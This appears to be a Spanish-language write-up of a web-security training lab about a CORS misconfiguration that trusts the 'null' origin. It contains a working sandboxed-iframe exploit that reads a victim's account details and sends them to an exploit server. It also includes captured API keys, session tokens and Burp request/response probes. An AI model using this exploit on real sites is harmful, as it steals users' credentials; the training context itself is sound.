# 🥳 Laboratorio: Vulnerabilidad CORS con origen nulo confiable

ste sitio web tiene una configuración CORS insegura porque confía en el origen "nulo".

Para resolver la práctica de laboratorio, cree algo de JavaScript que utilice CORS para recuperar la clave API del administrador y cargue el código en su servidor de explotación. La práctica de laboratorio se resuelve cuando envía correctamente la clave API del administrador.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales:wiener:peter



RESOLUCIÓN:

USAMOS EL MISMO SCRIPT CASI IGUAL AL DE CORS BASICO, SOLO QUE PARA LOGRAR QUE LA SSOLICITUDES SE MANDEN CON UN ORIGEN NULO, TUVIMOS QUE IMPLEMENTAR EL SCRIPT COMO VALOR DEL PARAMETRO src="data:text/html, DENTRO DE UNA ETIQUETA IFRAME, Y EN ESTA TAMBIEN LA CARGAMOS CON EL PARAMETRO SANDBOX Y VALORES "allow-scripts allow-top-navigation allow-forms" LOGRANDO ASI; QUE CUANDO LA VICTIMA EJECUTA NUESTRO LINK MALICISIO ESTE REALICE UNA SOLICITUD NULA Y OBTENER EN EL LOG DE NUESTRO SERVIDOR LAS CREDENCIALES DE API KEY.

CORROVOIRAMOS EN LA SOLICITUD DE ACOUNTDETAILING QUE PODEMOS CARGAR UN ORIGEN CRUZADO Y NOS RESPONDE CON Access-Control-Allow-Origin: NULL y Access-Control-Allow-Credentials: true COMPROBANDO ASI QUE PODEMOS REALIZAR UNA SOLICITUD CRUZADA A TARVES DE NUESTRO SERVIDOR MALISIOSO POR ACEPTAR ACCESO A ORIGENES COMO NULOS, USANDO AL USUARIO VICTIMA, CONSIGUIENDO CON NUESTRO SCRIPT LAS CREDENCIALES DEL MISMO SIENDO ESTAS DE ADMINISTRADOR Y SU API KEY.

```python
// pyth

------------------


SCRIPT PROPIO:


https://0aff009b031a605780ef0dfb0054005c.web-security-academy.net/accountDetails/



<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Ataque P4IM0N- CORS ORIGEN NULO</title>
</head>
<body>
    <h1>Ataque P4IM0N- CORS ORIGEN NULO</h1>

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
        var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://0aff009b031a605780ef0dfb0054005c.web-security-academy.net/accountDetails',true);
	req.withCredentials = true;
	req.send();

	function reqListener() {
	   location='https://exploit-0a78001c032660f680300cb601fa004f.exploit-server.net/log?key='+this.responseText;
	};
</script>"></iframe>
</body>
</html>







LOG CON KLAS KEY DELÑ ADMINISTRADOR:

key={  "username": "administrator",  "email": "",  "apikey": "opvw1LeyL6hGnIto0BWLi5njcQI8NGAS",  "sessions": [    "0mkziheR4321CNUtbswyHzgwX1fFxeHw"  ]



USAMOS EL MISMO SCRIPT CASI IGUAL  AL DE CORS BASICO,  SOLO QUE PARA LOGRAR QUE LA SSOLICITUDES SE MANDEN CON UN ORIGEN NULO, TUVIMOS QUE IMPLEMENTAR EL SCRIPT COMO VALOR DEL PARAMETRO  src="data:text/html,<script> DENTRO DE UNA ETIQUETA IFRAME, Y EN ESTA TAMBIEN LA CARGAMOS CON EL PARAMETRO SANDBOX Y VALORES "allow-scripts allow-top-navigation allow-forms" LOGRANDO ASI; QUE CUANDO LA VICTIMA EJECUTA NUESTRO LINK MALICISIO ESTE REALICE UNA SOLICITUD NULA Y OBTENER EN EL LOG DE NUESTRO SERVIDOR LAS CREDENCIALES DE API KEY. 



-----------------



BURPSUITE:



REQUEST INFO SENCIBLE:


GET /accountDetails HTTP/2
Host: 0aff009b031a605780ef0dfb0054005c.web-security-academy.net
Cookie: session=hEqQSHdlM6u7HmDTDkbMkmscyTjrHw1x
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aff009b031a605780ef0dfb0054005c.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Content-Length: 2




RESPONSE INFO SENCIBLE:


HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "yteKJQrcTBVFEBt6yAAydiAPlfQ8LDx4",
  "sessions": [
    "hEqQSHdlM6u7HmDTDkbMkmscyTjrHw1x"
  ]
}


-----------


REQUEST COMPROBANDO DOMINIOS Y SUBDOMINIOS DE ORIGEN:

GET /accountDetails HTTP/2
Host: 0aff009b031a605780ef0dfb0054005c.web-security-academy.net
Cookie: session=hEqQSHdlM6u7HmDTDkbMkmscyTjrHw1x
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aff009b031a605780ef0dfb0054005c.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Content-Length: 2
Origin:https://0aff009b031a605780ef0dfb0054005c.web-security-academy.net.P4IM0N.com


RESPONSE COMPROBANDO DOMINIOS Y SUBDOMINIOS DE ORIGEN:


HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "yteKJQrcTBVFEBt6yAAydiAPlfQ8LDx4",
  "sessions": [
    "hEqQSHdlM6u7HmDTDkbMkmscyTjrHw1x"
  ]
}

----


REQUEST COMPROBANDO DOMINIOS Y SUBDOMINIOS DE ORIGEN:


GET /accountDetails HTTP/2
Host: 0aff009b031a605780ef0dfb0054005c.web-security-academy.net
Cookie: session=hEqQSHdlM6u7HmDTDkbMkmscyTjrHw1x
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aff009b031a605780ef0dfb0054005c.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Content-Length: 0
Origin: https://P4IM0N0aff009b031a605780ef0dfb0054005c.web-security-academy.net


RESPONSE COMPROBANDO DOMINIOS Y SUBDOMINIOS DE ORIGEN:


HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "yteKJQrcTBVFEBt6yAAydiAPlfQ8LDx4",
  "sessions": [
    "hEqQSHdlM6u7HmDTDkbMkmscyTjrHw1x"
  ]
}


------------

REQUEST COMPROBANDO ORIGENES COMFIABLES DEL SITIO:



GET /accountDetails HTTP/2
Host: 0aff009b031a605780ef0dfb0054005c.web-security-academy.net
Cookie: session=hEqQSHdlM6u7HmDTDkbMkmscyTjrHw1x
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aff009b031a605780ef0dfb0054005c.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Origin: https://0aff009b031a605780ef0dfb0054005c.web-security-academy.net


RESPONSE COMPROBANDO ORIGENES COMFIABLES DEL SITIO:


HTTP/2 200 OK
Access-Control-Allow-Origin: https://0aff009b031a605780ef0dfb0054005c.web-security-academy.net
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "yteKJQrcTBVFEBt6yAAydiAPlfQ8LDx4",
  "sessions": [
    "hEqQSHdlM6u7HmDTDkbMkmscyTjrHw1x"
  ]
}


---------------

REQUEST COMPROBANDO ORIGENES NULOS:


GET /accountDetails HTTP/2
Host: 0aff009b031a605780ef0dfb0054005c.web-security-academy.net
Cookie: session=hEqQSHdlM6u7HmDTDkbMkmscyTjrHw1x
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aff009b031a605780ef0dfb0054005c.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Origin: null




RESPONSE COMPROBANDO ORIGENES NULOS:


HTTP/2 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149
 
{
  "username": "wiener",
  "email": "",
  "apikey": "yteKJQrcTBVFEBt6yAAydiAPlfQ8LDx4",
  "sessions": [
    "hEqQSHdlM6u7HmDTDkbMkmscyTjrHw1x"
  ]
}
```

